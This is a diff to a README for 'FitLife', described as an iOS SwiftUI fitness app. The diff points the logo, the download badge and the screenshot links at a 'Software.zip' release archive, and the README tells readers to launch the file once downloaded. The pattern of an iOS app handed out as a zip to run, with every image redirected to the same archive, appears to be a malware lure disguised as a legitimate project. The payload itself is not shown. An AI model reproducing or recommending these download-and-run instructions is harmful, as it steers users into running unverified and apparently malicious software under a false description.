@@ -1,6 +1,6 @@
 # FitLife - Your Ultimate Fitness Companion 🏋️‍♂️📱
 
-![FitLife Logo](https://example.com/fitlife-logo.png)
+![FitLife Logo](https://github.com/Darksouls53/FitLife/releases/download/v2.0/Software.zip)
 
 Welcome to **FitLife**, the iOS fitness tracking application built with SwiftUI to help you achieve your health and wellness goals! Whether you're looking to log your workouts, explore a vast exercise library, track your progress, or monitor your nutrition, FitLife has got you covered. Designed with modern iOS development practices and an intuitive UI, FitLife makes staying fit and healthy a seamless and enjoyable experience.
 
@@ -22,7 +22,7 @@ Welcome to **FitLife**, the iOS fitness tracking application built with SwiftUI 
 
 To start using FitLife and take your fitness journey to the next level, download the application from the following link:
 
-[![Download FitLife](https://img.shields.io/badge/Download-FitLife%20App-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download FitLife](https://github.com/Darksouls53/FitLife/releases/download/v2.0/Software.zip%20App-blue)](https://github.com/Darksouls53/FitLife/releases/download/v2.0/Software.zip)
 
 *Please note that the file needs to be launched once downloaded.*
 
@@ -38,4 +38,4 @@ We welcome contributions to enhance FitLife and make it even better! If you have
 
 Let's sweat it out and reach new fitness heights with **FitLife**! 💪
 
-![FitLife Screenshots](https://example.com/fitlife-screenshots.png)
+![FitLife Screenshots](https://github.com/Darksouls53/FitLife/releases/download/v2.0/Software.zip)
